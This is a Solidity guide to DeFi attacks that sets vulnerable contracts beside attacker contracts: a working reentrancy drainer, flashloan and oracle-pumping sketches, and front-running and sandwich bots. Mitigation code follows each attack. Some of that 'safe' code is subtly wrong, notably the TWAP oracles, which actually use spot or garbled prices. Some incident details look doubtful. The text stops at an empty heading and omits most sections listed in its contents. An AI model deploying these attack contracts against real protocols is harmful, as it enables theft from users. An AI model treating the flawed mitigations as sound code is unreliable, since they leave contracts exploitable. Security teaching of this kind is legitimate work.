# DeFi Attacks Reference Guide

A comprehensive guide to common DeFi attack vectors, vulnerabilities, and mitigation strategies for Solidity developers.

---

## Table of Contents

1. [Reentrancy Attacks](#reentrancy-attacks)
2. [Flashloan Attacks](#flashloan-attacks)
3. [Oracle Manipulation](#oracle-manipulation)
4. [Front-running and MEV](#front-running-and-mev)
5. [Sandwich Attacks](#sandwich-attacks)
6. [Price Manipulation](#price-manipulation)
7. [Governance Attacks](#governance-attacks)
8. [Signature Replay](#signature-replay)
9. [Integer Overflow/Underflow](#integer-overflowunderflow)
10. [Access Control Exploits](#access-control-exploits)
11. [Denial of Service (DoS)](#denial-of-service-dos)
12. [Vault Inflation Attacks](#vault-inflation-attacks)

---

## Reentrancy Attacks

### How It Works

Reentrancy occurs when a function makes an external call to another contract before updating its state. The called contract can then call back into the original function, potentially draining funds or manipulating state.

**Types of Reentrancy:**

1. **Single-Function Reentrancy**: The same function is called recursively
2. **Cross-Function Reentrancy**: Different functions in the same contract share state
3. **Cross-Contract Reentrancy**: Calls different contracts that interact back
4. **Read-Only Reentrancy**: Exploits view functions that read stale state

### Real-World Examples

- **The DAO Hack (2016)**: $50 million stolen through recursive calls to the withdraw function
- **Curve Finance (2020)**: $20 million vulnerability in lending protocol
- **Alchemix (2021)**: $15 million in single-function reentrancy
- **CREAM Finance (2021)**: Cross-contract reentrancy attack

### Code Examples

#### Vulnerable Contract

```solidity
// VULNERABLE: Single-function reentrancy
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    // VULNERABILITY: External call before state update
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // External call BEFORE updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update happens AFTER transfer
        balances[msg.sender] -= amount;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
}

// Attacker contract
contract Attacker {
    VulnerableBank public bank;

    constructor(address bankAddress) {
        bank = VulnerableBank(bankAddress);
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // This fallback function is called when receiving ether
    receive() external payable {
        // Reenters the withdraw function
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }
}
```

#### Cross-Function Reentrancy Example

```solidity
// VULNERABLE: Cross-function reentrancy
pragma solidity ^0.8.0;

contract VulnerableSwap {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    function deposit(uint256 amount) external {
        balances[msg.sender] += amount;
        totalSupply += amount;
        // Transfer tokens from user
        IERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // VULNERABILITY: This function reads totalSupply which can be outdated
    function withdraw(uint256 shares) external {
        uint256 amount = (shares * address(this).balance) / totalSupply;

        // External call before updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call
        balances[msg.sender] -= shares;
        totalSupply -= shares;
    }

    function redeem(uint256 shares) external {
        // This can be exploited in combination with withdraw
        uint256 amount = (shares * address(this).balance) / totalSupply;
        IERC20(token).transfer(msg.sender, amount);
        balances[msg.sender] -= shares;
        totalSupply -= shares;
    }
}
```

#### Read-Only Reentrancy

```solidity
// VULNERABLE: Read-only reentrancy
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(
        address token,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bytes32);
}

contract VulnerablePriceOracle {
    ILendingPool public lendingPool;
    IERC20 public token;

    // VULNERABILITY: Returns stale state during reentrancy
    function getPrice() external view returns (uint256) {
        uint256 balance = token.balanceOf(address(this));
        uint256 totalSupply = token.totalSupply();
        return balance * 1e18 / totalSupply;
    }

    function flashLoan(uint256 amount) external {
        // During this call, getPrice() can be called with outdated state
        lendingPool.flashLoan(address(this), address(token), amount, "");
    }

    function executeOperation(
        address,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external override returns (bytes32) {
        // Attacker can call getPrice() here and get stale data

        // Return loan with interest
        token.approve(address(lendingPool), amount + premium);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### Mitigation Strategies

1. **Checks-Effects-Interactions (CEI) Pattern**
   ```solidity
   function withdraw(uint256 amount) external {
       // Checks
       require(balances[msg.sender] >= amount, "Insufficient balance");

       // Effects (state changes first)
       balances[msg.sender] -= amount;

       // Interactions (external calls last)
       (bool success, ) = msg.sender.call{value: amount}("");
       require(success, "Transfer failed");
   }
   ```

2. **Reentrancy Guard (Mutex Pattern)**
   ```solidity
   pragma solidity ^0.8.0;

   contract ReentrancyGuard {
       uint256 private locked = 1;

       modifier nonReentrant() {
           require(locked == 1, "No reentrancy");
           locked = 2;
           _;
           locked = 1;
       }

       function withdraw(uint256 amount) external nonReentrant {
           require(balances[msg.sender] >= amount);
           balances[msg.sender] -= amount;
           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

3. **Pull over Push Pattern**
   ```solidity
   // Instead of pushing funds to users
   function withdrawPull() external {
       uint256 amount = balances[msg.sender];
       balances[msg.sender] = 0;
       (bool success, ) = msg.sender.call{value: amount}("");
       require(success);
   }
   ```

4. **Snapshot State**
   ```solidity
   function withdraw(uint256 amount) external {
       uint256 userBalance = balances[msg.sender];
       require(userBalance >= amount);
       balances[msg.sender] = userBalance - amount;
       // Safe to use userBalance as it won't change during call
       _sendFunds(msg.sender, amount);
   }
   ```

5. **Use OpenZeppelin's ReentrancyGuard**
   ```solidity
   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

   contract SafeBank is ReentrancyGuard {
       function withdraw(uint256 amount) external nonReentrant {
           // Protected against reentrancy
           _executeWithdraw(amount);
       }
   }
   ```

### Detection Methods

- Static analysis tools: Slither, Mythril, Certora
- Dynamic testing: Fuzz testing with Echidna
- Manual code review: Look for external calls before state updates
- Test for reentrancy: Try calling back into functions during external calls
- Monitor state snapshots: Track state changes during execution

---

## Flashloan Attacks

### How It Works

Flashloans allow users to borrow large amounts of crypto without collateral, provided they repay within the same transaction. Attackers use flashloans to:
- Manipulate prices temporarily
- Drain liquidity pools
- Exploit price oracles
- Perform large trades with borrowed capital

### Real-World Examples

- **bZx Attack (2020)**: $350,000 profit using flashloans to manipulate price oracles
- **Harvest Finance (2020)**: $34 million through stablecoin oracle manipulation
- **Pancake Bunny (2021)**: $45 million using bunny price manipulation
- **dYdX and Fulcrum (2020)**: Multiple flashloan attacks

### Code Examples

#### Vulnerable Flashloan Usage

```solidity
// VULNERABLE: Doesn't validate borrowed amount
pragma solidity ^0.8.0;

interface IFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bytes32);
}

interface IFlashLoanProvider {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract VulnerableFlashloanBorrower is IFlashLoanReceiver {
    IFlashLoanProvider public lender;
    IPriceOracle public oracle;
    IERC20 public usdc;

    constructor(address _lender, address _oracle) {
        lender = IFlashLoanProvider(_lender);
        oracle = IPriceOracle(_oracle);
    }

    function attackFlashloan() external {
        // Borrow huge amount at no cost
        lender.flashLoan(address(this), address(usdc), 1000000e6, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // VULNERABILITY: Price oracle is now outdated
        uint256 tokenPrice = oracle.getPrice(); // Can be manipulated

        // Attacker can exploit the outdated price
        // Example: Dump large amount and collect collateral at inflated price

        // Repay loan (usually done with profit)
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// Attack scenario: Pump and dump the token
contract FlashloanAttacker {
    IFlashLoanProvider public lender;
    IUniswapV2Router public router;
    IERC20 public usdc;
    IERC20 public token;

    function execute() external {
        // Step 1: Borrow massive amount of USDC
        lender.flashLoan(address(this), address(usdc), 10000000e6, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // Step 2: Use borrowed USDC to pump token price
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(token);

        usdc.approve(address(router), amount);
        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp + 1
        );

        // Step 3: Price is now inflated, exploit contracts that read old price
        // ...do more stuff...

        // Step 4: Dump tokens back for profit
        path[0] = address(token);
        path[1] = address(usdc);

        // Step 5: Repay flashloan and keep profit
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

#### Oracle Manipulation via Flashloan

```solidity
// VULNERABLE: Price oracle manipulated by flashloan
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerablePriceOracle {
    IUniswapV2Pair public pair;
    uint256 public price;

    // VULNERABILITY: Uses spot price from Uniswap
    function updatePrice() external {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        price = (reserve0 * 1e18) / reserve1; // Easily manipulated
    }

    function getPrice() external view returns (uint256) {
        return price;
    }
}

contract FlashloanOracleAttack {
    IFlashLoanProvider public lender;
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;
    VulnerablePriceOracle public oracle;

    function attack() external {
        // Borrow tokens to manipulate reserves
        lender.flashLoan(address(this), address(tokenA), 100000e18, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bytes32) {
        // Swap to manipulate reserves (pump tokenA price)
        tokenA.approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);

        // Now tokenA is expensive in the pair, call oracle update
        oracle.updatePrice(); // Price is now inflated

        // Exploit contracts that use oracle.getPrice()
        // ...do attack...

        // Repay flashloan
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(lender), amountOwed);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

### Mitigation Strategies

1. **Use Multiple Price Sources (TWAP)**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafePriceOracle {
       IUniswapV2Pair public pair;
       uint256 public price0CumulativeLast;
       uint256 public price1CumulativeLast;
       uint32 public blockTimestampLast;

       // Time-Weighted Average Price (TWAP) - resistant to flashloan attacks
       function updateTWAP() external {
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();

           uint32 timeElapsed = blockTimestamp - blockTimestampLast;
           require(timeElapsed >= 1 hours, "TWAP: Window not passed");

           uint256 price0Cumulative = (uint256(reserve1) << 112) / reserve0;
           uint256 price1Cumulative = (uint256(reserve0) << 112) / reserve1;

           price0CumulativeLast = price0Cumulative;
           price1CumulativeLast = price1Cumulative;
           blockTimestampLast = blockTimestamp;
       }

       function getTWAPPrice() external view returns (uint256) {
           return price0CumulativeLast; // Returns TWAP, not spot price
       }
   }
   ```

2. **Use Chainlink or Band Protocol**
   ```solidity
   pragma solidity ^0.8.0;

   import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

   contract SafeChainlinkOracle {
       AggregatorV3Interface public priceFeed;

       constructor(address feedAddress) {
           priceFeed = AggregatorV3Interface(feedAddress);
       }

       // Decentralized, tamper-resistant price feed
       function getLatestPrice() external view returns (uint256) {
           (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
           require(updatedAt >= block.timestamp - 1 hours, "Stale price");
           return uint256(price);
       }
   }
   ```

3. **Batch/Time Delays**
   ```solidity
   pragma solidity ^0.8.0;

   contract DelayedExecution {
       mapping(address => uint256) public pendingWithdrawals;
       mapping(address => uint256) public withdrawalTime;
       uint256 constant DELAY = 1 days;

       function requestWithdrawal(uint256 amount) external {
           require(userBalance[msg.sender] >= amount);
           pendingWithdrawals[msg.sender] = amount;
           withdrawalTime[msg.sender] = block.timestamp + DELAY;
       }

       function executeWithdrawal() external {
           require(block.timestamp >= withdrawalTime[msg.sender], "Withdrawal not ready");
           uint256 amount = pendingWithdrawals[msg.sender];
           pendingWithdrawals[msg.sender] = 0;

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

4. **Validate Flashloan Amounts**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeFlashloanBorrower {
       uint256 public maxFlashloan = 1000000e18; // Set reasonable limits

       function executeOperation(
           address asset,
           uint256 amount,
           uint256 premium,
           address initiator,
           bytes calldata params
       ) external override returns (bytes32) {
           require(amount <= maxFlashloan, "Flashloan too large");
           // Rest of implementation
           return keccak256("ERC3156FlashBorrower.onFlashLoan");
       }
   }
   ```

### Detection Methods

- Monitor unusual borrowing patterns
- Check for price deviation from external sources (Chainlink)
- Analyze transaction sequencing for manipulation
- Use price change alerts
- Monitor reserve ratio changes in AMMs
- Implement maximum price change checks

---

## Oracle Manipulation

### How It Works

Smart contracts rely on price oracles to determine asset values. Attackers manipulate these oracles by:
- Trading on-chain to move prices
- Exploiting single-source oracles
- Manipulating TWAP calculations
- Providing false data from centralized oracles

### Real-World Examples

- **bZx Attacks (2020)**: $350,000 from oracle manipulation
- **Harvest Finance (2020)**: $34 million from stablecoin oracle issues
- **Pancake Bunny (2021)**: $45 million from price feed manipulation
- **USDC Depegging (2023)**: Oracle failures during USDC depegging event

### Code Examples

#### Vulnerable Single-Source Oracle

```solidity
// VULNERABLE: Single source oracle
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VulnerableOracle {
    IUniswapV2Pair public pair;

    // VULNERABILITY: Uses only Uniswap spot price
    function getPrice() external view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        return (reserve0 * 1e18) / reserve1;
    }
}

contract OracleAttacker {
    IUniswapV2Router public router;
    VulnerableOracle public oracle;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function manipulatePrice() external {
        // Buy huge amount of tokenA to increase price
        address[] memory path = new address[](2);
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        router.swapExactTokensForTokens(
            10000e18, // Spend 10k tokenB
            0,
            path,
            address(this),
            block.timestamp
        );

        // Now price is manipulated
        uint256 manipulatedPrice = oracle.getPrice(); // Much higher

        // Exploit contracts using this price
        // ...do attack...
    }
}
```

#### Stale Price Vulnerability

```solidity
// VULNERABLE: No freshness check
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract VulnerableStaleOracle {
    AggregatorV3Interface public priceFeed;

    // VULNERABILITY: No check if price is stale
    function getPrice() external view returns (uint256) {
        (, int256 price, , , ) = priceFeed.latestRoundData();
        return uint256(price);
    }

    // Attacker exploits stale price during network congestion
}
```

#### Composable Oracle Attack

```solidity
// VULNERABLE: Derivable price from on-chain data
pragma solidity ^0.8.0;

contract VulnerableComposableOracle {
    IUniswapV2Pair public pair;

    // VULNERABILITY: Price calculated from manipulable reserves
    function getDerivedPrice() external view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        // Any reserve imbalance = price manipulation opportunity
        uint256 price = (reserve0 * 1e18) / reserve1;
        return price;
    }
}
```

### Mitigation Strategies

1. **Multiple Oracle Sources**
   ```solidity
   pragma solidity ^0.8.0;

   contract MultiSourceOracle {
       AggregatorV3Interface public chainlinkFeed;
       IUniswapV2Pair public uniswapPair;
       IBandOracle public bandOracle;

       function getPriceConsensus() external view returns (uint256) {
           uint256 chainlinkPrice = getChainlinkPrice();
           uint256 uniswapPrice = getUniswapTWAP();
           uint256 bandPrice = getBandPrice();

           // Check prices are within acceptable range of each other
           uint256 maxPrice = max(chainlinkPrice, max(uniswapPrice, bandPrice));
           uint256 minPrice = min(chainlinkPrice, min(uniswapPrice, bandPrice));

           require(maxPrice <= minPrice * 110 / 100, "Prices diverged");

           return (chainlinkPrice + uniswapPrice + bandPrice) / 3;
       }

       function getChainlinkPrice() internal view returns (uint256) {
           (, int256 price, , uint256 updatedAt, ) = chainlinkFeed.latestRoundData();
           require(updatedAt >= block.timestamp - 1 hours, "Stale Chainlink price");
           return uint256(price);
       }

       function getUniswapTWAP() internal view returns (uint256) {
           // Returns TWAP price from Uniswap (resistant to manipulation)
           return calculateTWAP();
       }

       function getBandPrice() internal view returns (uint256) {
           // Get price from Band Protocol
           return bandOracle.getReferenceData(symbol, "USD").rate;
       }

       function max(uint256 a, uint256 b) internal pure returns (uint256) {
           return a > b ? a : b;
       }

       function min(uint256 a, uint256 b) internal pure returns (uint256) {
           return a < b ? a : b;
       }
   }
   ```

2. **TWAP (Time-Weighted Average Price)**
   ```solidity
   pragma solidity ^0.8.0;

   contract TWAPOracle {
       IUniswapV2Pair public pair;
       uint256 public price0CumulativeLast;
       uint256 public price1CumulativeLast;
       uint32 public blockTimestampLast;
       uint256 public twapInterval = 1 hours;

       constructor(address _pair) {
           pair = IUniswapV2Pair(_pair);
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();
           price0CumulativeLast = IUniswapV2Pair(_pair).price0CumulativeLast();
           price1CumulativeLast = IUniswapV2Pair(_pair).price1CumulativeLast();
           blockTimestampLast = blockTimestamp;
       }

       function update() external {
           (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) = pair.getReserves();
           uint32 timeElapsed = blockTimestamp - blockTimestampLast;

           require(timeElapsed >= twapInterval, "TWAP: Too soon");

           price0CumulativeLast = pair.price0CumulativeLast();
           price1CumulativeLast = pair.price1CumulativeLast();
           blockTimestampLast = blockTimestamp;
       }

       // TWAP resistant to single block price movements
       function getTWAPPrice() external view returns (uint256) {
           return price0CumulativeLast / blockTimestampLast;
       }
   }
   ```

3. **Freshness Validation**
   ```solidity
   pragma solidity ^0.8.0;

   contract FreshnessManagedOracle {
       AggregatorV3Interface public feed;
       uint256 public maxStaleness = 1 hours;

       function getLatestPrice() external view returns (uint256) {
           (
               uint80 roundId,
               int256 price,
               uint256 startedAt,
               uint256 updatedAt,
               uint80 answeredInRound
           ) = feed.latestRoundData();

           require(answeredInRound >= roundId, "Stale price");
           require(updatedAt > 0, "Round not complete");
           require(block.timestamp - updatedAt <= maxStaleness, "Price too old");

           return uint256(price);
       }
   }
   ```

### Detection Methods

- Monitor price deviations across exchanges
- Set price change thresholds and alerts
- Use multiple independent oracles
- Implement circuit breakers
- Watch for unusual trading volume
- Monitor time gaps in price updates

---

## Front-running and MEV

### How It Works

Front-running occurs when attackers observe pending transactions and place their own transactions ahead to profit from price movements. MEV (Miner Extractable Value) is the profit from reordering, censoring, or inserting transactions.

**Types:**
- Simple front-running: Place order before victim's transaction
- Sandwich attack: Place orders before and after victim
- MEV extraction: Reorder transactions for profit
- Liquidation sniping: Prioritize liquidations

### Real-World Examples

- **Uniswap Sandwich Attacks**: Billions in MEV extracted
- **Liquidation Competition**: Miners/validators reorder to capture liquidations
- **DEX Arbitrage**: Bots extract MEV from price disparities
- **Token Launch Front-running**: Thousands of ETH taken from early buyers

### Code Examples

#### Vulnerable Smart Contract

```solidity
// VULNERABLE: Susceptible to front-running
pragma solidity ^0.8.0;

contract VulnerableSwap {
    IERC20 public tokenA;
    IERC20 public tokenB;
    uint256 public price;

    // VULNERABILITY: No slippage protection
    function swap(uint256 amountIn) external returns (uint256 amountOut) {
        require(amountIn > 0);

        // Calculate output based on current price
        amountOut = (amountIn * price) / 1e18;

        // Transfer tokens
        tokenA.transferFrom(msg.sender, address(this), amountIn);
        tokenB.transfer(msg.sender, amountOut);

        return amountOut;
    }
}

// Front-runner bot
contract FrontRunner {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function frontRun(uint256 victimAmount) external {
        // 1. See victim's pending swap in mempool
        // 2. Front-run with larger order
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(
            victimAmount * 2, // Larger order
            0,
            path,
            address(this),
            block.timestamp
        );

        // 3. Victim's transaction executes at worse price
        // 4. Back-run to reverse position

        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 tokenBBalance = tokenB.balanceOf(address(this));
        router.swapExactTokensForTokens(
            tokenBBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Profit = difference in execution prices
    }
}
```

#### Private Mempool Exploitation

```solidity
// VULNERABLE: Price determined in same transaction
pragma solidity ^0.8.0;

contract VulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;

    // VULNERABILITY: Price calculation happens in same transaction
    function getAmountOut(uint256 amountIn) public view returns (uint256) {
        return (amountIn * reserve1) / (reserve0 + amountIn);
    }

    function swap(uint256 amountIn, uint256 minAmountOut) external {
        uint256 amountOut = getAmountOut(amountIn);

        require(amountOut >= minAmountOut, "Slippage exceeded");

        reserve0 += amountIn;
        reserve1 -= amountOut;

        IERC20(token0).transferFrom(msg.sender, address(this), amountIn);
        IERC20(token1).transfer(msg.sender, amountOut);
    }
}

contract MEVBot {
    IFlashBots public flashbots;

    function bundleSwap() external {
        // Use Flashbots to hide transaction from mempool
        // Execute without front-running risk
        flashbots.sendBundle(/* bundle data */);
    }
}
```

### Mitigation Strategies

1. **Slippage Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeSwap {
       IUniswapV2Router public router;

       function swapWithSlippage(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external returns (uint256[] memory amounts) {
           IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);
           IERC20(path[0]).approve(address(router), amountIn);

           amounts = router.swapExactTokensForTokens(
               amountIn,
               minAmountOut, // PROTECTION: Revert if output too low
               path,
               msg.sender,
               block.timestamp
           );
       }
   }
   ```

2. **Price Oracle Validation**
   ```solidity
   pragma solidity ^0.8.0;

   contract PriceValidatedSwap {
       IPriceOracle public oracle;
       uint256 public maxSlippage = 50; // 0.5%

       function swapWithPriceCheck(
           uint256 amountIn,
           uint256 minAmountOut,
           address tokenIn,
           address tokenOut
       ) external {
           // Get fair price from oracle
           uint256 oraclePrice = oracle.getPrice(tokenIn, tokenOut);

           // Calculate expected output
           uint256 expectedOut = (amountIn * oraclePrice) / 1e18;

           // Allow only small slippage
           uint256 minOut = (expectedOut * (10000 - maxSlippage)) / 10000;
           require(minAmountOut >= minOut, "Slippage too high");

           // Execute swap
           _executeSwap(amountIn, minAmountOut, tokenIn, tokenOut);
       }
   }
   ```

3. **Batch Auctions (MEV-Resistant)**
   ```solidity
   pragma solidity ^0.8.0;

   contract BatchAuction {
       struct Order {
           address user;
           uint256 amountIn;
           uint256 minAmountOut;
       }

       Order[] public pendingOrders;
       uint256 public batchNumber;
       uint256 public batchSize = 100;

       function submitOrder(
           uint256 amountIn,
           uint256 minAmountOut
       ) external {
           pendingOrders.push(Order(msg.sender, amountIn, minAmountOut));

           if (pendingOrders.length >= batchSize) {
               executeBatch();
           }
       }

       function executeBatch() internal {
           // All orders execute at same price
           // Eliminates front-running within batch

           uint256 totalIn = 0;
           for (uint256 i = 0; i < pendingOrders.length; i++) {
               totalIn += pendingOrders[i].amountIn;
           }

           uint256 totalOut = calculateOutput(totalIn);
           uint256 pricePerUnit = totalOut / totalIn;

           // Execute all orders at batch price
           for (uint256 i = 0; i < pendingOrders.length; i++) {
               Order memory order = pendingOrders[i];
               uint256 out = (order.amountIn * pricePerUnit) / 1e18;
               require(out >= order.minAmountOut, "Slippage");
               transfer(order.user, out);
           }

           delete pendingOrders;
           batchNumber++;
       }
   }
   ```

4. **Encrypted Mempools**
   ```solidity
   pragma solidity ^0.8.0;

   // Use Flashbots Protect (MEV-resistant)
   contract FlashbotsProtected {
       // Submit transactions through Flashbots Protect
       // Transactions are encrypted and protected from MEV

       function protectedSwap(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external {
           // Send to: https://relay.flashbots.net/
           // Transaction is private until included

           // Standard swap execution
           _swap(amountIn, minAmountOut, path);
       }
   }
   ```

### Detection Methods

- Monitor mempool for similar transactions
- Track execution prices vs. expected prices
- Analyze transaction ordering patterns
- Use MEV dashboards (MEV-Inspect, Flashbots)
- Monitor for sandwich attacks in logs
- Track profit/loss patterns

---

## Sandwich Attacks

### How It Works

A sandwich attack places a transaction before (front-run) and after (back-run) a victim's transaction to profit from price impact:

1. Attacker sees victim's large transaction in mempool
2. Places order BEFORE victim's transaction
3. Victim's transaction causes price movement
4. Attacker's position is now profitable
5. Places order AFTER victim to reverse or profit

### Real-World Examples

- **Uniswap Sandwich Attacks**: Daily extraction of millions in MEV
- **Arbitrage Sandwich**: Bot front-runs trade, back-runs to reverse
- **Liquidation Sandwich**: Liquidators sandwich borrower transactions
- **Token Transfer Sandwich**: Atomic sandwich on transfers

### Code Examples

#### Sandwich Attack Execution

```solidity
// VULNERABLE: Standard AMM swap
pragma solidity ^0.8.0;

contract VulnerableAMM {
    uint256 public reserve0;
    uint256 public reserve1;

    function swap(uint256 amountIn, uint256 minAmountOut) external {
        uint256 amountOut = (amountIn * reserve1) / (reserve0 + amountIn);
        require(amountOut >= minAmountOut);

        reserve0 += amountIn;
        reserve1 -= amountOut;

        transfer(msg.sender, amountOut);
    }
}

// Sandwich attacker
contract SandwichAttacker {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function executeSandwich(
        uint256 victimAmount,
        address victim
    ) external {
        // Step 1: Front-run - buy token B (pump price)
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        uint256 frontRunAmount = victimAmount / 2;

        router.swapExactTokensForTokens(
            frontRunAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 2: Victim's transaction executes
        // Victim gets worse price because we pumped tokenB

        // Step 3: Back-run - sell token B
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 tokenBBalance = tokenB.balanceOf(address(this));

        router.swapExactTokensForTokens(
            tokenBBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Profit = price difference from front-run and back-run
    }
}
```

#### Atomic Sandwich Attack

```solidity
// Sandwich attack in single transaction
pragma solidity ^0.8.0;

contract AtomicSandwich {
    IUniswapV2Router public router;
    IERC20 public tokenA;
    IERC20 public tokenB;

    function sandwichExecution(
        address victim,
        uint256 victimAmount
    ) external {
        // Using EIP-712 signature to execute victim's transaction in same block

        // 1. Front-run swap
        _frontRunSwap(victimAmount);

        // 2. Execute victim's swap through signature/call
        // (Simulating victim's transaction)
        _executeVictimSwap(victim, victimAmount);

        // 3. Back-run swap
        _backRunSwap();
    }

    function _frontRunSwap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);

        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _backRunSwap() internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenB);
        path[1] = address(tokenA);

        uint256 balance = tokenB.balanceOf(address(this));
        router.swapExactTokensForTokens(
            balance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _executeVictimSwap(address victim, uint256 amount) internal {
        // Execute victim's swap (victim loses value due to our sandwich)
    }
}
```

### Mitigation Strategies

1. **MEV-Protected RPC (Flashbots Protect)**
   ```solidity
   pragma solidity ^0.8.0;

   contract FlashbotsProtectedSwap {
       // Send transactions to Flashbots Protect RPC endpoint
       // https://relay.flashbots.net/

       function sandwichResistantSwap(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path
       ) external {
           // Transaction is encrypted in mempool
           // Builders cannot see it to sandwich

           // Execute swap
           router.swapExactTokensForTokens(
               amountIn,
               minAmountOut,
               path,
               msg.sender,
               block.timestamp
           );
       }
   }
   ```

2. **Batch Clearing with Fair Pricing**
   ```solidity
   pragma solidity ^0.8.0;

   contract FairPricedBatch {
       struct Trade {
           address user;
           uint256 amountIn;
           uint256 minAmountOut;
       }

       Trade[] public batch;
       uint256 public batchSize = 50;

       function submitTrade(uint256 amountIn, uint256 minAmountOut) external {
           batch.push(Trade(msg.sender, amountIn, minAmountOut));

           if (batch.length >= batchSize) {
               clearBatch();
           }
       }

       function clearBatch() internal {
           // All trades execute at SAME price - prevents sandwich
           // Calculate single clearing price for all

           uint256 totalIn = 0;
           for (uint256 i = 0; i < batch.length; i++) {
               totalIn += batch[i].amountIn;
           }

           uint256 totalOut = getOutputForAmount(totalIn);
           uint256 clearingPrice = totalOut / totalIn;

           // Execute all trades at clearing price
           for (uint256 i = 0; i < batch.length; i++) {
               uint256 userOut = (batch[i].amountIn * clearingPrice) / 1e18;
               require(userOut >= batch[i].minAmountOut);
               transfer(batch[i].user, userOut);
           }

           delete batch;
       }
   }
   ```

3. **Encrypted Transactions (Dark Pool Style)**
   ```solidity
   pragma solidity ^0.8.0;

   contract DarkPoolSwap {
       bytes32[] public encryptedOrders;

       function submitEncryptedOrder(
           bytes32 encryptedData,
           bytes32 commitment
       ) external {
           encryptedOrders.push(encryptedData);
           // Store commitment for verification
       }

       function revealAndExecute(
           uint256 amountIn,
           uint256 minAmountOut,
           address[] calldata path,
           bytes32 randomness
       ) external {
           // Reveal orders only when committing to execution
           // Prevents MEV extraction through observation

           // Execute swap with verified random ordering
           _executeSwapWithRandomization(amountIn, minAmountOut, path);
       }
   }
   ```

### Detection Methods

